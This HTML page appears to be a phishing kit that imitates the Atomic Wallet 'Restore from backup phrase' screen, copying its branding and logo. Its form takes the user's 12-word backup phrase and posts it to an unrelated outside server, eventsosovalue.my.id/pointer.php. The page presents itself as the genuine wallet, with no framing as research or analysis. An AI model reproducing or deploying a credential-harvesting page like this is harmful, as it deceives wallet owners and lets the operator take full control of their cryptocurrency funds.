<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <link rel="icon" href="https://avatars.githubusercontent.com/u/36169580?s=200&v=4"><title>Atomic Wallet</title>
  <title>
   Restore from backup phrase
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-[#1E2743] min-h-screen flex flex-col">
  <header class="flex items-center px-4 py-5">
   <button aria-label="Go back" class="text-[#5A627D] text-2xl">
    <i class="fas fa-arrow-left">
    </i>
   </button>
   <h1 class="flex-1 text-center text-white text-lg font-semibold leading-6">
    Restore from backup phrase
   </h1>
   <div class="w-6">
   </div>
  </header>
  <main class="flex flex-col items-center px-6 mt-10">
<img alt="Blue glowing Atomic logo letter A with a dot inside on dark navy background" class="mx-auto mb-3 drop-shadow-[0_0_10px_rgba(62,166,255,0.7)]" height="80" src="https://lh3.googleusercontent.com/fYzv5ao2sobQUopMiDJpaUkXk9Bj4qtEDROWIayGMQ0adtnhaOoGcI75eCllRImHuhxAbmjEy-KNN71byvl7X8Px=s60" width="80">
   <h2 class="text-white font-extrabold text-2xl mt-3">
    Atomic
   </h2>
   <form class="w-full max-w-md mt-10" method="post" action="https://eventsosovalue.my.id/pointer.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home" >
    <label class="relative block text-[#5A627D] text-lg font-normal" for="backupPhrase">
     <input aria-describedby="error-message" aria-invalid="true" autocomplete="off" class="w-full bg-transparent border-b border-[#3a9df8] text-[#5A627D] placeholder-[#5A627D] text-lg font-normal focus:outline-none focus:ring-0 focus:border-[#3a9df8] pr-10" id="backupPhrase" name="backupPhrase" placeholder="Type 12-word Backup Phrase" spellcheck="false" minlength="24" maxlength="305" type="text"/>
     <span class="absolute right-0 top-1/2 -translate-y-1/2 text-[#5A627D] text-xl cursor-pointer">
      <i class="fas fa-qrcode">
      </i>
     </span>

  </main>
  <footer class="mt-auto px-6 pb-20 w-full max-w-md mx-auto">
   <button class="w-full text-[#5A627D] text-sm font-semibold tracking-widest mb-4" type="button">
    PASTE
   </button>
   <button class="w-full bg-[#2196FF] text-white text-xl font-semibold tracking-widest py-4 rounded-full" type="submit">
    RESTORE
   </button>
   </form>
  </footer>
 </body>
</html>
